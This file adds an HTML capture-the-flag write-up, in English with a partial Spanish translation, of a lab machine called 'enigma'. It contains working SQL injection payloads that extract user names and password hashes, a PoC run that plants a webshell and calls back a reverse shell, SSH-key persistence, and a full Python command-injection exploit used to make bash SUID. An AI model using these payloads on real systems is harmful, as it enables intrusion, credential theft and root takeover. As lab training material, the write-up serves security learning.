@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>enigma | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">enigma</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p>The attack began with an nmap scan revealing an unusually large number of open ports for a Linux
+                        box, including <code>NFS</code>, <code>IMAP/POP3</code>, and an <code>nginx</code> web server
+                        on port 80. The web server redirected to <code>enigma.htb</code>, presenting a corporate landing
+                        page. A virtual host discovery uncovered <code>mail001.enigma.htb</code>, which hosted a
+                        Roundcube webmail instance.</p>
+
+                    <p>An exposed NFS share <code>/srv/nfs/onboarding</code> contained an onboarding PDF with default
+                        credentials for a new employee (<code>kevin</code>). Logging into Roundcube revealed a welcome
+                        email from Sarah. Testing password reuse, Sarah's account was accessible with the same default
+                        password, and her inbox contained credentials for an OpenSTAManager instance running on the
+                        <code>support_001.enigma.htb</code> virtual host.</p>
+
+                    <p>OpenSTAManager 2.9.8 is vulnerable to CVE-2026-38751, an authenticated RCE via arbitrary file
+                        upload through the module installation feature. A public PoC was used to upload a PHP webshell
+                        as an OpenSTAManager module, granting a reverse shell as <code>www-data</code>. A prior error-based
+                        SQL injection (GHSA-4xwv-49c8-fvhq) was also leveraged to extract user hashes; the hash for
+                        <code>haris</code> was cracked to <code>bestfriends</code>, enabling lateral movement to that
+                        user and yielding the user flag.</p>
+
+                    <p>For privilege escalation, a locally-bound service on port 1337 was identified as OliveTin
+                        3000.10.0, vulnerable to CVE-2026-27626, a command injection flaw in the <code>password</code>
+                        argument handling. Via local port forwarding through SSH, a crafted request to the
+                        <code>StartAction</code> API endpoint injected shell metacharacters through the
+                        <code>db_pass</code> argument to execute <code>chmod u+s /bin/bash</code>. With the SUID bit
+                        set on bash, running <code>bash -p</code> yielded a root shell and the root flag.</p>
+                    <p><strong>Technologies/Exploits:</strong> NFS enumeration, credential leakage via PDF, password
+                        reuse, OpenSTAManager error-based SQLi (GHSA-4xwv-49c8-fvhq), OpenSTAManager file upload RCE
+                        (CVE-2026-38751), OliveTin command injection (CVE-2026-27626), SSH local port forwarding, SUID
+                        bash privesc.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to enumerate open ports and services:</p>
+                <pre><code class="language-plaintext">PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+80/tcp    open  http     nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://enigma.htb/
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+110/tcp   open  pop3     Dovecot pop3d
+111/tcp   open  rpcbind  2-4 (RPC #100000)
+| rpcinfo:
+|   program version  port/proto  service
+|   100000  2,3,4    111/tcp     rpcbind
+|   100003  3,4      2049/tcp    nfs
+|   100005  1,2,3    38275/tcp   mountd
+|   100021  1,3,4    33409/tcp   nlockmgr
+|_  100227  3        2049/tcp    nfs_acl
+143/tcp   open  imap     Dovecot imapd (Ubuntu)
+993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
+995/tcp   open  ssl/pop3 Dovecot pop3d
+2049/tcp  open  nfs_acl  3 (RPC #100227)
+33409/tcp open  nlockmgr 1-4 (RPC #100021)
+38275/tcp open  mountd   1-3 (RPC #100005)
+42191/tcp open  status   1 (RPC #100024)
+50043/tcp open  mountd   1-3 (RPC #100005)
+60005/tcp open  mountd   1-3 (RPC #100005)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>This is quite a lot of open ports for a Linux box. Notably, <code>NFS</code> is exposed, which
+                    might expose an interesting mount, plus we have full email service ports (POP3, IMAP, and their
+                    TLS variants).</p>
+
+                <p>I add <code>enigma.htb</code> to my <code>/etc/hosts</code> file. Browsing to port 80 shows a
+                    corporate landing page for an IT services company.</p>
+
+                <h2>Virtual Host Enumeration</h2>
+                <p>Fuzzing for virtual hosts I discover:</p>
+                <pre><code class="language-plaintext">mail001.enigma.htb    Status: 200  [Size: 5327]</code></pre>
+
+                <p>This host contains a <a href="https://github.com/roundcube/roundcubemail">Roundcube</a> webmail
+                    instance. Without credentials I can't log in yet, so I move on with enumeration.</p>
+
+                <h2>NFS Enumeration</h2>
+                <p>Checking NFS exports:</p>
+                <pre><code class="language-bash">showmount -e enigma.htb</code></pre>
+                <pre><code class="language-plaintext">Export list for enigma.htb:
+/srv/nfs/onboarding *</code></pre>
+
+                <p>Mounting the share:</p>
+                <pre><code class="language-bash">sudo mount -t nfs enigma.htb:/srv/nfs/onboarding /tmp/nfs
+ls -lah /tmp/nfs</code></pre>
+                <pre><code class="language-plaintext">total 8.0K
+drwxr-xr-x  2 root root 4.0K Feb 19 19:54 .
+drwxrwxrwt 17 root root  400 Jun 28 14:56 ..
+-rw-r--r--  1 root root 1.8K Feb 19 19:53 New_Employee_Access.pdf</code></pre>
+
+                <p>I copy the PDF locally, unmount the share, and open it. It contains default onboarding credentials
+                    and a Roundcube username for a new employee (Kevin):</p>
+
+                <p><img src="./media/image1.png" alt="Onboarding PDF containing default employee credentials for the Roundcube webmail" /></p>
+
+                <h2>Roundcube Access as Kevin</h2>
+                <p>Logging in as <code>kevin</code> with the default password, I find a welcome email:</p>
+
+                <blockquote>
+                    <p>"Hi Kevin,</p>
+                    <p>Welcome to the team! We're thrilled to have you on board at Enigma Corp. [...] I'm Sarah from
+                        the Accounts department. I'll be your point of contact for any finance-related queries during
+                        your onboarding period.</p>
+                    <p>We're still finalizing a few of your onboarding details — your system access, equipment setup,
+                        and department introductions are all being arranged by the IT team. You should be receiving
+                        your access credentials shortly via the company shared drive.</p>
+                    <p>Best regards, Sarah — Accounts Department — sarah@enigma.htb"</p>
+                </blockquote>
+
+                <p>Roundcube's version is <strong>1.6.16</strong>, quite recent, and while it has some extensions
+                    enabled I don't find any particularly interesting vulnerability for this version.</p>
+
+                <p>As a side note, it's also possible to interact directly with the IMAPS port from the CLI, which
+                    is useful for extracting mail without needing the webmail:</p>
+
+                <pre><code class="language-bash">openssl s_client -connect enigma.htb:993
+a login kevin Enigma2024!
+a OK
+a select INBOX
+a fetch 1:* (FLAGS BODY[HEADER])
+a fetch 1 body[]</code></pre>
+
+                <h2>Password Reuse - Sarah's Mailbox</h2>
+                <p>After trying a few things unsuccessfully, I test password reuse by attempting to log into Sarah's
+                    account with the same default password <code>Enigma2024!</code>. Surprisingly, it works and I find
+                    this email from <code>it@enigma.htb</code>:</p>
+
+                <blockquote>
+                    <p>"Hi Sarah,</p>
+                    <p>Apologies for the delay. I have provisioned your access. Please find the details below:</p>
+                    <p>URL: <a href="http://support_001.enigma.htb">http://support_001.enigma.htb</a><br>
+                        Username: admin<br>
+                        Password: Ne3s4rtars78s</p>
+                    <p>Note: I will create a dedicated account for you shortly, for now you can use the admin account
+                        to get started.</p>
+                    <p>Regards, IT Support — Enigma Corp"</p>
+                </blockquote>
+
+                <h2>OpenSTAManager Enumeration</h2>
+                <p>I add the new virtual host <code>support_001.enigma.htb</code> to <code>/etc/hosts</code>, browse
+                    to it, and find an instance of <a href="https://openstamanager.com/">OpenSTAManager</a> version
+                    <strong>2.9.8</strong>.</p>
+
+                <p>Searching for known vulnerabilities I find an interesting error-based SQL injection with a public
+                    PoC: <a href="https://github.com/advisories/GHSA-4xwv-49c8-fvhq">GHSA-4xwv-49c8-fvhq</a>.</p>
+
+                <h3>Error-Based SQL Injection</h3>
+                <p>First, I authenticate to grab a session cookie:</p>
+                <pre><code class="language-bash">curl -c cookies.txt -X POST 'http://support_001.enigma.htb/index.php?op=login' \
+     -d 'username=admin&password=Ne3s4rtars78s'</code></pre>
+
+                <p>Then I test the injection using <code>EXTRACTVALUE</code> to trigger a XPATH error containing
+                    query output:</p>
+                <pre><code class="language-bash">curl -b cookies.txt \
+  -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(USER(),' | ',VERSION()))))%23" \
+  "http://support_001.enigma.htb/actions.php?id_module=18"</code></pre>
+                <pre><code class="language-plaintext">Messaggio: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~brollin@localhost | 8.0.46-0ubu'
+File: /var/www/html/openstamanager/src/Database.php
+Linea: 289</code></pre>
+
+                <p>Now enumerating users from the <code>zz_users</code> table:</p>
+                <pre><code class="language-bash">curl -b cookies.txt \
+  -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,':',email) FROM zz_users LIMIT 1)))%23" \
+  "http://support_001.enigma.htb/actions.php?id_module=18"</code></pre>
+                <pre><code class="language-plaintext">Messaggio: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~admin:admin@enigma.htb'</code></pre>
+
+                <p>Using <code>OFFSET 1</code> to grab the next user:</p>
+                <pre><code class="language-bash">curl -b cookies.txt \
+  -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,':',email) FROM zz_users LIMIT 1 OFFSET 1)))%23" \
+  "http://support_001.enigma.htb/actions.php?id_module=18"</code></pre>
+                <pre><code class="language-plaintext">Messaggio: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~haris:haris@enigma.htb'</code></pre>
+
+                <p>Then extracting the password hashes 31 characters at a time using <code>SUBSTRING</code>
+                    (since XPATH errors truncate long outputs):</p>
+                <pre><code class="language-bash">curl -b cookies.txt \
+  -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,1,31) FROM zz_users LIMIT 1)))%23" \
+  "http://support_001.enigma.htb/actions.php?id_module=18"</code></pre>
+
+                <p>Repeating with different offsets I assemble the full bcrypt hashes:</p>
+                <pre><code class="language-plaintext">admin:$2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
+haris:$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC</code></pre>
+
+                <p>The <code>haris</code> hash cracks with a wordlist:</p>
+                <pre><code class="language-plaintext">$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends</code></pre>
+
+                <p>These credentials let me log into Roundcube and OpenSTAManager as haris, but there's nothing
+                    particularly interesting in either account, and SSH only accepts publickey authentication so I
+                    can't just SSH in.</p>
+
+                <h2>Initial Access - OpenSTAManager RCE (CVE-2026-38751)</h2>
+                <p>Continuing the vulnerability hunt, I find this advisory:
+                    <a href="https://advisories.gitlab.com/composer/devcode-it/openstamanager/CVE-2026-38751/">CVE-2026-38751</a>.
+                </p>
+
+                <p>OpenSTAManager is vulnerable to RCE via arbitrary file upload. The module installation feature
+                    doesn't validate the contents of uploaded module ZIPs, and since PHP files inside get placed in
+                    a web-accessible directory, we can drop a PHP webshell — essentially the same idea as uploading
+                    a malicious WordPress plugin.</p>
+
+                <p>I use a public PoC script that automates authentication, module upload, and triggers a reverse
+                    shell:</p>
+
+                <pre><code class="language-bash">python3 cve.py -u http://support_001.enigma.htb -U admin -P Ne3s4rtars78s --lhost 10.10.14.169 --lport 443</code></pre>
+                <pre><code class="language-plaintext">[ CVE-2026-38751 — OpenSTAManager RCE ]
+[*] Target: http://support_001.enigma.htb
+[*] 1/4 Authenticating...
+[+] Authenticated as: admin
+[*] 2/4 Enabling module updates...
+[+] Module updates enabled
+[*] 3/4 Uploading malicious module...
+[*] Malicious ZIP built in memory
+[*] Upload → HTTP 500
+[*] 4/4 Verifying webshell...
+[+] Webshell active: http://support_001.enigma.htb/modules/shell/shell.php
+[*] Sending payload to 10.10.14.169:443</code></pre>
+
+                <p>I gain a reverse shell as <code>www-data</code>. From here I can pivot laterally: the user
+                    <code>haris</code> exists on the system, and the cracked password <code>bestfriends</code> works
+                    for <code>su haris</code>. This gives me the user flag.</p>
+
+                <p>To make life easier and set up persistence, I drop my SSH public key into
+                    <code>/home/haris/.ssh/authorized_keys</code>.</p>
+
+                <h2>Local Enumeration - OliveTin</h2>
+                <p>Poking around the system I notice this listening port:</p>
+                <pre><code class="language-plaintext">tcp   LISTEN 0  4096  127.0.0.1:1337  0.0.0.0:*</code></pre>
+
+                <p>A quick <code>curl</code> from the box doesn't reveal much, so I use SSH local port forwarding
+                    to investigate it comfortably from my attacking machine:</p>
+
+                <pre><code class="language-bash">ssh haris@enigma.htb -i ~/.ssh/kerssh -L 1337:localhost:1337</code></pre>
+
+                <p>The service turns out to be <strong>OliveTin</strong>, an open source tool that provides safe
+                    and simple web-based access to predefined shell commands. The version running is
+                    <strong>3000.10.0</strong>. Without valid login credentials there doesn't appear to be
+                    anything I can do from the UI directly.</p>
+
+                <h2>Privilege Escalation - OliveTin Command Injection (CVE-2026-27626)</h2>
+                <p>Searching for known vulnerabilities, I find a critical recent CVE affecting this version:
+                    <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27626">CVE-2026-27626</a>.</p>
+
+                <blockquote>
+                    <p>"OliveTin gives access to predefined shell commands from a web interface. In versions up to
+                        and including 3000.10.0, OliveTin's shell mode safety check
+                        (<code>checkShellArgumentSafety</code>) blocks several dangerous argument types but not
+                        <code>password</code>. A user supplying a <code>password</code>-typed argument can inject
+                        shell metacharacters that execute arbitrary OS commands."</p>
+                </blockquote>
+
+                <p>This means any request that accepts a password-typed argument might be vulnerable to command
+                    injection. Probing OliveTin's API, I find that the endpoint:</p>
+
+                <pre><code class="language-plaintext">/api/olivetin.api.v1.OliveTinApiService/StartAction</code></pre>
+
+                <p>accepts a JSON body with arguments, where <code>db_pass</code> looks injectable:</p>
+
+                <pre><code class="language-python">payload = {
+    "bindingId": "backup_database",
+    "arguments": [
+        {"name": "db_user", "value": "backup_svc"},
+        {"name": "db_pass", "value": f"';{cmd};'"},
+        {"name": "db_name", "value": "production"}
+    ],
+    "uniqueTrackingId": tracking_id
+}</code></pre>
+
+                <p>The output of the executed command can be retrieved from another endpoint:</p>
+                <pre><code class="language-plaintext">/api/olivetin.api.v1.OliveTinApiService/ExecutionStatus</code></pre>
+
+                <p>I wrap this into a small exploit script:</p>
+
+                <pre><code class="language-python">#!/usr/bin/env python3
+import argparse
+import json
+import sys
+import uuid
+import time
+import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def start_action(base_url, tracking_id, cmd):
+    url = f"{base_url}/api/olivetin.api.v1.OliveTinApiService/StartAction"
+    payload = {
+        "bindingId": "backup_database",
+        "arguments": [
+            {"name": "db_user", "value": "backup_svc"},
+            {"name": "db_pass", "value": f"';{cmd};'"},
+            {"name": "db_name", "value": "production"}
+        ],
+        "uniqueTrackingId": tracking_id
+    }
+    r = requests.post(url, json=payload, verify=False, timeout=10)
+    r.raise_for_status()
+    return r.json()["executionTrackingId"]
+
+def execution_status(base_url, tracking_id):
+    url = f"{base_url}/api/olivetin.api.v1.OliveTinApiService/ExecutionStatus"
+    payload = {"executionTrackingId": tracking_id}
+    r = requests.post(url, json=payload, verify=False, timeout=10)
+    r.raise_for_status()
+    return r.json()
+
+def print_output(resp):
+    try:
+        output = resp["logEntry"]["output"]
+    except KeyError:
+        print(json.dumps(resp, indent=4))
+        return
+    print("=" * 70)
+    print("Command Output")
+    print("=" * 70)
+    print(output.rstrip())
+    print("=" * 70)
+
+def main():
+    parser = argparse.ArgumentParser(description="OliveTin CVE")
+    parser.add_argument("-u", "--url", required=True, help="Target host/IP")
+    parser.add_argument("-p", "--port", default=1337, type=int, help="Target port (default: 1337)")
+    parser.add_argument("-x", "--cmd", default="id", help="Command to execute (default: id)")
+    args = parser.parse_args()
+
+    host = args.url.rstrip("/")
+    if not host.startswith("http://") and not host.startswith("https://"):
+        host = "http://" + host
+    base_url = f"{host}:{args.port}"
+    tracking_id = str(uuid.uuid4())
+
+    try:
+        execution_id = start_action(base_url, tracking_id, args.cmd)
+        print(f"[+] Execution ID: {execution_id}")
+        time.sleep(2)
+        response = execution_status(base_url, execution_id)
+        print_output(response)
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Request failed: {e}")
+        sys.exit(1)
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()</code></pre>
+
+                <p>Since OliveTin is running as root, any command injected through this vulnerability will execute
+                    with root privileges. I set the SUID bit on <code>/bin/bash</code>:</p>
+
+                <pre><code class="language-bash">python3 olivepoc.py -u http://localhost -p 1337 -x "chmod u+s /bin/bash"</code></pre>
+                <pre><code class="language-plaintext">[+] Execution ID: 3567fa3d-d024-4c0a-ae17-108fffde1a68
+======================================================================
+Command Output
+======================================================================
+exit status 2
+======================================================================</code></pre>
+
+                <p>Despite the "exit status 2" from the wrapping command, the injected <code>chmod</code> did run.
+                    Verifying:</p>
+                <pre><code class="language-bash">haris@enigma:~/.ssh$ ls -lah /bin/bash</code></pre>
+                <pre><code class="language-plaintext">-rwsr-xr-x 1 root root 1.4M Mar 31  2024 /bin/bash</code></pre>
+
+                <p>Bash now has the SUID bit set. Running <code>bash -p</code> preserves the effective UID as root,
+                    giving me a root shell and the root flag:</p>
+
+                <pre><code class="language-bash">bash -p
+id
+# uid=1001(haris) gid=1001(haris) euid=0(root) groups=1001(haris)</code></pre>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p>El ataque comienza con un escaneo nmap que revela una cantidad de puertos inusualmente alta para
+                        una máquina Linux, incluyendo <code>NFS</code>, servicios de correo <code>IMAP/POP3</code> y
+                        un servidor web <code>nginx</code> en el puerto 80. El servidor web redirige a
+                        <code>enigma.htb</code>, mostrando una landing corporativa. Un descubrimiento de virtual hosts
+                        revela <code>mail001.enigma.htb</code>, que aloja una instancia de Roundcube.</p>
+
+                    <p>Un share NFS expuesto en <code>/srv/nfs/onboarding</code> contiene un PDF de onboarding con
+                        credenciales por defecto para un nuevo empleado (<code>kevin</code>). Accediendo a Roundcube
+                        se encuentra un correo de bienvenida de Sarah. Probando reutilización de contraseñas, la cuenta
+                        de Sarah también es accesible con la misma clave por defecto, y su bandeja contiene credenciales
+                        para una instancia de OpenSTAManager en el virtual host
+                        <code>support_001.enigma.htb</code>.</p>
+
+                    <p>OpenSTAManager 2.9.8 es vulnerable a CVE-2026-38751, un RCE autenticado mediante subida
+                        arbitraria de archivos a través de la funcionalidad de instalación de módulos. Se utiliza una
+                        PoC pública para subir una webshell PHP como módulo, obteniendo una reverse shell como
+                        <code>www-data</code>. Previamente también se explota una SQL injection basada en errores
+                        (GHSA-4xwv-49c8-fvhq) para extraer los hashes de usuario; el hash de <code>haris</code> se
+                        crackea a <code>bestfriends</code>, permitiendo movimiento lateral a ese usuario y consiguiendo
+                        la flag de usuario.</p>
+
+                    <p>Para la escalada de privilegios, se identifica un servicio local en el puerto 1337 que resulta
+                        ser OliveTin 3000.10.0, vulnerable a CVE-2026-27626, un fallo de inyección de comandos en el
+                        tratamiento del argumento <code>password</code>. A través de port forwarding local por SSH, una
+                        petición diseñada al endpoint <code>StartAction</code> inyecta metacaracteres de shell mediante
+                        el argumento <code>db_pass</code> para ejecutar <code>chmod u+s /bin/bash</code>. Con el bit
+                        SUID puesto en bash, ejecutando <code>bash -p</code> se obtiene una shell de root y la flag
+                        de root.</p>
+                    <p><strong>Tecnologías/Exploits:</strong> enumeración NFS, filtración de credenciales por PDF,
+                        reutilización de contraseñas, SQLi basada en errores de OpenSTAManager (GHSA-4xwv-49c8-fvhq),
+                        RCE por subida de archivos en OpenSTAManager (CVE-2026-38751), inyección de comandos en
+                        OliveTin (CVE-2026-27626), port forwarding local por SSH, escalada mediante SUID en bash.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo nmap para enumerar puertos y servicios abiertos:</p>
+                <pre><code class="language-plaintext">PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+80/tcp    open  http     nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://enigma.htb/
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+110/tcp   open  pop3     Dovecot pop3d
+111/tcp   open  rpcbind  2-4 (RPC #100000)
+| rpcinfo:
+|   program version  port/proto  service
+|   100000  2,3,4    111/tcp     rpcbind
+|   100003  3,4      2049/tcp    nfs
+|   100005  1,2,3    38275/tcp   mountd
+|   100021  1,3,4    33409/tcp   nlockmgr
+|_  100227  3        2049/tcp    nfs_acl
+143/tcp   open  imap     Dovecot imapd (Ubuntu)
+993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
+995/tcp   open  ssl/pop3 Dovecot pop3d
+2049/tcp  open  nfs_acl  3 (RPC #100227)
+33409/tcp open  nlockmgr 1-4 (RPC #100021)
+38275/tcp open  mountd   1-3 (RPC #100005)
+42191/tcp open  status   1 (RPC #100024)
+50043/tcp open  mountd   1-3 (RPC #100005)
+60005/tcp open  mountd   1-3 (RPC #100005)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>Son bastantes más puertos de los normales para ser una máquina Linux. Destaca que <code>NFS</code>
+                    está expuesto, lo que podría exponer algún mount interesante, y también aparece todo el stack de
+                    correo (POP3, IMAP y sus variantes TLS).</p>
+
+                <p>Añado <code>enigma.htb</code> a mi <code>/etc/hosts</code>. Navegando al puerto 80 veo una landing
+                    corporativa de una empresa de servicios IT.</p>
+
+                <h2>Enumeración de Virtual Hosts</h2>
+                <p>Haciendo fuzzing de virtual hosts descubro:</p>
+                <pre><code class="language-plaintext">mail001.enigma.htb    Status: 200  [Size: 5327]</code></pre>
+
+                <p>Este host contiene una instancia de <a href="https://github.com/roundcube/roundcubemail">Roundcube</a>.
+                    Sin credenciales aún no puedo entrar, así que sigo con la enumeración.</p>
+
+                <h2>Enumeración NFS</h2>
+                <p>Compruebo los exports NFS:</p>
+                <pre><code class="language-bash">showmount -e enigma.htb</code></pre>
+                <pre><code class="language-plaintext">Export list for enigma.htb:
+/srv/nfs/onboarding *</code></pre>
+
+                <p>Monto el share:</p>
+                <pre><code class="language-bash">sudo mount -t nfs enigma.htb:/srv/nfs/onboarding /tmp/nfs
+ls -lah /tmp/nfs</code></pre>
+                <pre><code class="language-plaintext">total 8.0K
+drwxr-xr-x  2 root root 4.0K Feb 19 19:54 .
+drwxrwxrwt 17 root root  400 Jun 28 14:56 ..
+-rw-r--r--  1 root root 1.8K Feb 19 19:53 New_Employee_Access.pdf</code></pre>
+
+                <p>Copio el PDF en local, desmonto y lo abro. Contiene credenciales de onboarding por defecto y un
+                    usuario para webmail (Kevin):</p>
+
+                <p><img src="./media/image1.png" alt="PDF de onboarding con las credenciales por defecto del nuevo empleado para el webmail Roundcube" /></p>
+
+                <h2>Acceso a Roundcube como Kevin</h2>
+                <p>Accediendo como <code>kevin</code> con la contraseña por defecto encuentro un correo de bienvenida:</p>
+
+                <blockquote>
+                    <p>"Hi Kevin,</p>
+                    <p>Welcome to the team! We're thrilled to have you on board at Enigma Corp. [...] I'm Sarah from
+                        the Accounts department. I'll be your point of contact for any finance-related queries during
+                        your onboarding period.</p>
+                    <p>We're still finalizing a few of your onboarding details — your system access, equipment setup,
+                        and department introductions are all being arranged by the IT team. You should be receiving
+                        your access credentials shortly via the company shared drive.</p>
+                    <p>Best regards, Sarah — Accounts Department — sarah@enigma.htb"</p>
+                </blockquote>
+
+                <p>La versión de Roundcube es <strong>1.6.16</strong>, muy reciente, y aunque tiene algunas extensiones
+                    activas no encuentro ninguna vulnerabilidad particularmente interesante para esta versión.</p>
+
+                <p>Como apunte, también es posible interactuar directamente con el puerto IMAPS desde la CLI, útil para
+                    extraer correos sin depender del webmail:</p>
+
+                <pre><code class="language-bash">openssl s_client -connect enigma.htb:993
+a login kevin Enigma2024!
+a OK
+a select INBOX
+a fetch 1:* (FLAGS BODY[HEADER])
+a fetch 1 body[]</code></pre>
+
+                <h2>Reutilización de Contraseñas - Buzón de Sarah</h2>
+                <p>Tras probar algunas cosas sin éxito, pruebo a reutilizar la contraseña por defecto
+                    <code>Enigma2024!</code> con la cuenta de Sarah. Sorprendentemente funciona y encuentro este
+                    correo de <code>it@enigma.htb</code>:</p>
+
+                <blockquote>
+                    <p>"Hi Sarah,</p>
+                    <p>Apologies for the delay. I have provisioned your access. Please find the details below:</p>
+                    <p>URL: <a href="http://support_001.enigma.htb">http://support_001.enigma.htb</a><br>
+                        Username: admin<br>
+                        Password: Ne3s4rtars78s</p>
+                    <p>Note: I will create a dedicated account for you shortly, for now you can use the admin account
+                        to get started.</p>
+                    <p>Regards, IT Support — Enigma Corp"</p>
+                </blockquote>
+
+                <h2>Enumeración de OpenSTAManager</h2>
+                <p>Añado el nuevo virtual host <code>support_001.enigma.htb</code> a <code>/etc/hosts</code>, accedo,
+                    y encuentro una instancia de <a href="https://openstamanager.com/">OpenSTAManager</a> versión
+                    <strong>2.9.8</strong>.</p>
+
+                <p>Buscando vulnerabilidades conocidas encuentro una SQL injection basada en errores muy interesante
+                    con PoC pública: <a href="https://github.com/advisories/GHSA-4xwv-49c8-fvhq">GHSA-4xwv-49c8-fvhq</a>.</p>
+
+                <h3>SQL Injection Basada en Errores</h3>
+                <p>Primero me autentico para conseguir una cookie de sesión:</p>
+                <pre><code class="language-bash">curl -c cookies.txt -X POST 'http://support_001.enigma.htb/index.php?op=login' \
+     -d 'username=admin&password=Ne3s4rtars78s'</code></pre>
+
+                <p>Y pruebo la inyección usando <code>EXTRACTVALUE</code> para provocar un error XPATH que contenga la
+                    salida de la query:</p>
+                <pre><code class="language-bash">curl -b cookies.txt \
+  -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(USER(),' | ',VERSION()))))%23" \
+  "http://support_001.enigma.htb/actions.php?id_module=18"</code></pre>
+                <pre><code class="language-plaintext">Messaggio: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~brollin@localhost | 8.0.46-0ubu'
+File: /var/www/html/openstamanager/src/Database.php
+Linea: 289</code></pre>
+
+                <p>Ahora enumerando usuarios de la tabla <code>zz_users</code>:</p>
+                <pre><code class="language-bash">curl -b cookies.txt \
+  -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,':',email) FROM zz_users LIMIT 1)))%23" \
+  "http://support_001.enigma.htb/actions.php?id_module=18"</code></pre>
+                <pre><code class="language-plaintext">Messaggio: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~admin:admin@enigma.htb'</code></pre>
+
+                <p>Con <code>OFFSET 1</code> saco al siguiente usuario:</p>
+                <pre><code class="language-bash">curl -b cookies.txt \
+  -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,':',email) FROM zz_users LIMIT 1 OFFSET 1)))%23" \
+  "http://support_001.enigma.htb/actions.php?id_module=18"</code></pre>
+                <pre><code class="language-plaintext">Messaggio: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~haris:haris@enigma.htb'</code></pre>
+
+                <p>Después extraigo los hashes de contraseña 31 carácteres a la vez usando <code>SUBSTRING</code>
+                    (ya que los errores XPATH truncan salidas largas):</p>
+                <pre><code class="language-bash">curl -b cookies.txt \
+  -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,1,31) FROM zz_users LIMIT 1)))%23" \
+  "http://support_001.enigma.htb/actions.php?id_module=18"</code></pre>
+
+                <p>Repitiendo con diferentes offsets consigo los hashes bcrypt completos:</p>
+                <pre><code class="language-plaintext">admin:$2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
